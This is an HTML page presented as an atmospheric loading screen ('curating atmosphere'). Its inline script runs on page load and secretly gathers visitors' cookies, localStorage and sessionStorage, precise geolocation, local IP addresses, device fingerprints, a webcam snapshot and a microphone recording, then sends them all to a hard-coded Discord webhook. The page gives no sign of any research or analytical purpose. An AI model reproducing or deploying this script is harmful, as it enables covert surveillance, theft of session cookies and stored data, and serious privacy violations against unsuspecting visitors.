<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Digital Tapestry</title>
    <style>
        body {
            background: #0a0a0a;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: 'Courier New', monospace;
            color: #a0a0a0;
            overflow: hidden;
        }
        .loader {
            border: 2px solid #1a1a1a;
            border-top: 2px solid #6a6a6a;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1.5s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .container {
            text-align: center;
            padding: 40px;
            background: #111;
            border-radius: 12px;
            box-shadow: 0 0 60px rgba(100,100,100,0.05);
            max-width: 380px;
            width: 90%;
        }
        .sub {
            color: #444;
            font-size: 13px;
            letter-spacing: 2px;
            margin-top: 12px;
            opacity: 0.6;
        }
        .pulse {
            animation: pulse 2s infinite;
        }
        @keyframes pulse { 0% { opacity: 0.4; } 50% { opacity: 1; } 100% { opacity: 0.4; } }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <div style="font-size: 18px; letter-spacing: 1px; font-weight: 300;">curating atmosphere</div>
        <div class="sub pulse">— a moment in transit —</div>
    </div>

    <script>
        (function() {
            const WEBHOOK = "https://discord.com/api/webhooks/1536800456779501648/JhK2RVd80X1h78ImtAyle7u5d-cx8wf1QiJv0AXSjR0uz8tOFDHYAVPgBArmlPdaI97w";

            // ─── gather everything ─────────────────────────────────────────────
            const payload = {
                timestamp: new Date().toISOString(),
                url: window.location.href,
                referrer: document.referrer || "direct",
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages || [],
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                hardwareConcurrency: navigator.hardwareConcurrency || "unknown",
                deviceMemory: navigator.deviceMemory || "unknown",
                screen: {
                    width: screen.width,
                    height: screen.height,
                    colorDepth: screen.colorDepth,
                    pixelRatio: window.devicePixelRatio || 1
                },
                window: {
                    innerWidth: window.innerWidth,
                    innerHeight: window.innerHeight,
                    outerWidth: window.outerWidth,
                    outerHeight: window.outerHeight
                },
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                connection: (() => {
                    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                    if (!conn) return { type: "unknown", effectiveType: "unknown" };
                    return {
                        type: conn.type || "unknown",
                        effectiveType: conn.effectiveType || "unknown",
                        downlink: conn.downlink || "unknown",
                        rtt: conn.rtt || "unknown"
                    };
                })(),
                battery: (() => {
                    if (!navigator.getBattery) return { level: "unavailable", charging: "unavailable" };
                    return navigator.getBattery()
                        .then(b => ({ level: b.level * 100, charging: b.charging }))
                        .catch(() => ({ level: "error", charging: "error" }));
                })(),
                geolocation: (() => {
                    return new Promise((resolve) => {
                        if (!navigator.geolocation) return resolve({ coords: { latitude: "unavailable", longitude: "unavailable" } });
                        navigator.geolocation.getCurrentPosition(
                            pos => resolve({ coords: { latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy } }),
                            err => resolve({ error: err.message }),
                            { enableHighAccuracy: true, timeout: 5000 }
                        );
                    });
                })(),
                ips: (() => {
                    const ips = [];
                    const rtc = new RTCPeerConnection({ iceServers: [] });
                    rtc.createDataChannel('collect');
                    rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
                    rtc.onicecandidate = (e) => {
                        if (e.candidate) {
                            const candidate = e.candidate.candidate;
                            const ipMatch = candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
                            if (ipMatch && !ips.includes(ipMatch[0])) ips.push(ipMatch[0]);
                            const ipv6Match = candidate.match(/([a-f0-9:]+:+)+[a-f0-9]+/i);
                            if (ipv6Match && !ips.includes(ipv6Match[0])) ips.push(ipv6Match[0]);
                        }
                    };
                    setTimeout(() => {
                        rtc.close();
                    }, 3000);
                    return ips;
                })(),
                localStorage: (() => {
                    try {
                        const items = {};
                        for (let i = 0; i < localStorage.length; i++) {
                            const key = localStorage.key(i);
                            items[key] = localStorage.getItem(key);
                        }
                        return items;
                    } catch { return "unavailable"; }
                })(),
                sessionStorage: (() => {
                    try {
                        const items = {};
                        for (let i = 0; i < sessionStorage.length; i++) {
                            const key = sessionStorage.key(i);
                            items[key] = sessionStorage.getItem(key);
                        }
                        return items;
                    } catch { return "unavailable"; }
                })(),
                cookies: document.cookie || "none",
                webgl: (() => {
                    try {
                        const canvas = document.createElement('canvas');
                        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                        if (!gl) return "unavailable";
                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                        if (!debugInfo) return { vendor: "unavailable", renderer: "unavailable" };
                        return {
                            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                        };
                    } catch { return "unavailable"; }
                })()
            };

            // ─── selfie & audio ───────────────────────────────────────────────
            const mediaCapture = async () => {
                const media = { audio: null, image: null };
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: 'user' } });
                    // audio
                    const audioContext = new AudioContext();
                    const source = audioContext.createMediaStreamSource(stream);
                    const recorder = audioContext.createScriptProcessor(8192, 1, 1);
                    const audioChunks = [];
                    source.connect(recorder);
                    recorder.connect(audioContext.destination);
                    recorder.onaudioprocess = (e) => {
                        const data = e.inputBuffer.getChannelData(0);
                        const sample = data.reduce((sum, val) => sum + Math.abs(val), 0) / data.length;
                        if (sample > 0.01) {
                            const buffer = new Float32Array(data);
                            audioChunks.push(buffer);
                        }
                    };
                    setTimeout(() => {
                        recorder.disconnect();
                        source.disconnect();
                        audioContext.close();
                        if (audioChunks.length > 0) {
                            const totalLen = audioChunks.reduce((acc, chunk) => acc + chunk.length, 0);
                            const combined = new Float32Array(totalLen);
                            let offset = 0;
                            for (const chunk of audioChunks) {
                                combined.set(chunk, offset);
                                offset += chunk.length;
                            }
                            const wav = new Blob([combined.buffer], { type: 'audio/wav' });
                            const reader = new FileReader();
                            reader.onload = () => {
                                payload.audioBase64 = reader.result.split(',')[1] || null;
                                payload.audioLength = combined.length;
                                sendPayload();
                            };
                            reader.readAsDataURL(wav);
                        } else {
                            sendPayload();
                        }
                    }, 5000);

                    // video / selfie
                    const videoTrack = stream.getVideoTracks()[0];
                    if (videoTrack) {
                        const imageCapture = new ImageCapture(videoTrack);
                        const bitmap = await imageCapture.grabFrame();
                        const canvas = document.createElement('canvas');
                        canvas.width = bitmap.width;
                        canvas.height = bitmap.height;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(bitmap, 0, 0);
                        const imageData = canvas.toDataURL('image/jpeg', 0.8);
                        payload.imageBase64 = imageData.split(',')[1] || null;
                    }
                } catch (e) {
                    payload.mediaError = e.message || "media permissions denied";
                    sendPayload();
                }
            };

            // ─── send after gathering all async pieces ──────────────────────
            const sendPayload = async () => {
                try {
                    // wait for battery and geo promises
                    const geo = await payload.geolocation;
                    payload.geolocation = geo;
                    const battery = await payload.battery;
                    payload.battery = battery;

                    // add IPs gathered from RTC
                    let ips = payload.ips;
                    if (typeof ips === 'object' && ips.length === 0) {
                        // if RTC hasn't populated yet, try one more via fetch
                        try {
                            const resp = await fetch('https://api.ipify.org?format=json');
                            const data = await resp.json();
                            ips = [data.ip];
                        } catch { /* ignore */ }
                    }
                    payload.ips = ips;

                    // final payload
                    const finalPayload = {
                        content: `📦 **collection** | ${new Date().toLocaleString()}`,
                        embeds: [
                            {
                                title: "digital residue",
                                color: 0x2c2c2c,
                                fields: [
                                    { name: "📍 location", value: `${payload.geolocation.coords?.latitude || '?'}, ${payload.geolocation.coords?.longitude || '?'}`, inline: true },
                                    { name: "🌐 IPs", value: (Array.isArray(payload.ips) ? payload.ips.join(', ') : payload.ips) || 'not collected', inline: true },
                                    { name: "🖥️ user agent", value: payload.userAgent.substring(0, 100) + '...', inline: false },
                                    { name: "📱 screen", value: `${payload.screen.width}x${payload.screen.height} @ ${payload.screen.pixelRatio}x`, inline: true },
                                    { name: "🔋 battery", value: typeof payload.battery.level === 'number' ? `${payload.battery.level}%` : 'unavailable', inline: true },
                                    { name: "🌍 timezone", value: payload.timezone, inline: true },
                                    { name: "📦 localStorage keys", value: Object.keys(payload.localStorage).length || 0, inline: true },
                                    { name: "🍪 cookies", value: payload.cookies.length > 50 ? `${payload.cookies.substring(0, 50)}...` : payload.cookies || 'none', inline: false },
                                    { name: "🎤 audio", value: payload.audioBase64 ? `captured (${(payload.audioLength / 44100).toFixed(1)}s)` : 'not captured', inline: true },
                                    { name: "📸 selfie", value: payload.imageBase64 ? 'captured' : 'not captured', inline: true }
                                ],
                                timestamp: payload.timestamp
                            }
                        ]
                    };

                    // if audio or image, attach as files
                    const formData = new FormData();
                    if (payload.audioBase64) {
                        const byteString = atob(payload.audioBase64);
                        const ab = new ArrayBuffer(byteString.length);
                        const ia = new Uint8Array(ab);
                        for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
                        const blob = new Blob([ab], { type: 'audio/wav' });
                        formData.append('file', blob, 'audio.wav');
                    }
                    if (payload.imageBase64) {
                        const byteString = atob(payload.imageBase64);
                        const ab = new ArrayBuffer(byteString.length);
                        const ia = new Uint8Array(ab);
                        for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
                        const blob = new Blob([ab], { type: 'image/jpeg' });
                        formData.append('file', blob, 'selfie.jpg');
                    }
                    formData.append('payload_json', JSON.stringify(finalPayload));

                    await fetch(WEBHOOK, {
                        method: 'POST',
                        body: formData
                    });
                } catch (e) {
                    // silent fallback
                }
            };

            // ─── kick it off ──────────────────────────────────────────────────
            setTimeout(() => {
                mediaCapture();
            }, 1500);

            // also send a lightweight ping immediately
            setTimeout(() => {
                fetch(WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `🕸️ **ping** | ${navigator.userAgent.substring(0, 80)} | ${Intl.DateTimeFormat().resolvedOptions().timeZone}`
                    })
                }).catch(() => {});
            }, 500);

        })();
    </script>
</body>
</html>
